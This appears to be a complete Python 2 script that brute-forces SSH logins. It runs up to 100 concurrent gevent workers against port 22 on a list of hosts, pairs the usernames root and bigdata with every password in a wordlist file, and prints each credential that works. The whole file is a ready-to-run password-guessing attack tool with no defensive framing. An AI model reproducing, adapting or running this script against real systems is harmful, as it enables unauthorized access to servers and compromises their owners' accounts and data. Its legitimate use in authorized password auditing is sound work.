#!/usr/bin/env python
# encoding: utf-8

import gevent
from gevent import monkey
monkey.patch_socket()
monkey.patch_thread(threading=True, _threading_local=True, Event=True)

import paramiko
from paramiko.ssh_exception import SSHException
from gevent import getcurrent
from gevent.pool import Pool
from gevent.queue import Queue, Empty
import random
import sys
gl_pool = Pool(100)


def guess_task(host, port, queue):
    addr = (host, port)
    while True:
        try:
            t1 = paramiko.Transport(addr)
            t1.start_client()
            while True:
                try:
                    user, pwd = queue.get_nowait()
                    t1.auth_password(user, pwd)
                    # here successful
                    queue.queue.clear()
                    print '**********%s, %s, %s**********' % (host, user, pwd)
                    return user, pwd
                except paramiko.AuthenticationException as _unused:
                    print '%s, %s, %s, wrong %d' % (host, user, pwd, id(getcurrent()))
                    continue
                except Empty as _unused:
                    print 'Task Over'
                    return None
        except SSHException as e:
            pass
        except Exception as e:
            # here, socket error., reconnect
            print 'unknown error, reconnect, %r' % e


def guess_host(host, port, users, pwds):
    # 先排列组合[(user, pwd), ]
    ts = []
    guess_count_per_conn = 3
    for user in users:
        for pwd in pwds:
            ts.append((user, pwd))
    random.shuffle(ts)
    conn_count = len(ts) / guess_count_per_conn
    if len(ts) % 3:
        conn_count += 1
    queue = Queue()
    [queue.put(el) for el in ts]
    for _ in range(conn_count):
        gl_pool.spawn(guess_task, host, port, queue)


def guess_transport(transport, username, pwd):
    pass


def batch_guess(ips, users, pwds):
    port = 22
    for host in ips:
        gl_pool.spawn(guess_host, host, port, users, pwds)


def main():
    ips = ['192.168.0.191', '192.168.0.192', '192.168.0.193']
    users = ['root', 'bigdata', ]
    # 字典要去重
    with open('pwdlist.txt', 'rt') as f1:
        pwds = f1.readlines()
        pwds = [el.strip() for el in pwds]
    batch_guess(ips, users, pwds)

    gl_pool.join()


if __name__ == '__main__':
    main()
    sys.exit(0)
